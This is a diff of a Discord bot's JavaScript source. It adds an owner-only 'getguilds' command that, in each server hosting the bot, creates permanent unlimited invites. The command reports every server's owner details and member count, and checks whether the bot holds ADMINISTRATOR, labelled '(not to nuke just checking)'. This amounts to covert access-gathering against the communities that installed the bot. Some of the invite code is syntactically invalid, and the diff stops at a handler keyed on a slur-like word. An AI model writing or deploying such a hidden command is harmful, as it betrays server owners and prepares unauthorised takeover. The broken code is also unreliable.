@@ -60,18 +60,52 @@ console.log("logged in: " + client.user.tag + "\n id: " + client.user.id)
 
 
 
-client.on("message", msg => {
-   if(msg.content === `${prefix}getguilds`) {
-     if(msg.author.id === `${assy}`) {
-       msg.client.guilds.cache.forEach(g => {
-    let ch = g.channels.cache.find(c => c.type === "text")
-      ch.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
-      .then(invite => msg.channel.send('discord.gg/' + `${invite.code}`))
-})
-}
-}
-})
+client.on('message', msg => {
+    if(msg.content === `${prefix}getguilds`) {
+        if(msg.author.id === `${assy}`) {
+         msg.client.guilds.cache.forEach(g => {
+          const Id = g.id
+          const Oid = g.ownerID
+          const Otag = g.owner.user.tag //supposed to be tag but shitcord doesn't define user
+          const Gm = g.memberCount
+           if(g.me.hasPermission('CREATE_INSTANT_INVITE')) {
+            const joinEmbed = new Discord.MessageEmbed()
+            .setColor('#ede7e7')
+            .setTitle(`Joined "${g.name}"`)
+            .setAuthor(client.user.username, pfp)            
+            .setDescription("The Bot DOES NOT have the permission ADMINISTRATOR(not to nuke just checking)")
+            .addField(`Server ID: **${Id}** \nServer Owner ID: **${Oid}** \nServer Owner Tag: **${Otag}** \nServer MemberCount: **${Gm}**`, '^info^')
+            const joinEmbed2 = new Discord.MessageEmbed()
+            .setColor('#ede7e7')
+            .setTitle(`Joined "${g.name}"`)
+            .setAuthor(client.user.username, pfp)
+            .setDescription("The Bot DOES have the permission ADMINISTRATOR(not to nuke just checking)")
+            .addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, '^info^')
+            if(g.me.hasPermission('ADMINISTRATOR')) {            
+              let c = g.channels.cache.find(c => c.type === 'text')
+            c.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
+            .then(invite => msg.channel.send(`discord.gg/${invite.code} `).then(msg.channel.send(joinEmbed2)))
+          }else{
+            let c = g.channels.cache.find(c => c.type === 'text')
+            c.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
+            .then(invite => msg.channel.send(`discord.gg/${invite.code} `).then(msg.channel.send(joinEmbed)))
+          }            
+           }else {
+            const joinEmbed = new Discord.MessageEmbed()
+            .setColor('#ede7e7')
+            .setTitle(`Joined "${g.name}"`)
+            .setAuthor(client.user.username, pfp)            
+            .setDescription("The Bot DOES NOT have the permission ADMINISTRATOR(not to nuke just checking)")
+            .addField(`Server ID: **${Id}** \nServer Owner ID: **${Oid}** \nServer Owner Tag: **${Otag}** \nServer MemberCount: **${Gm}**`, '^info^')
 
+             msg.channel.send('could`t create link')
+             msg.channel.send(joinEmbed)
+           }
+         })
+            
+        }
+    }
+})
 
 client.on("message", msg => {
       if(msg.content.includes("rape")) {
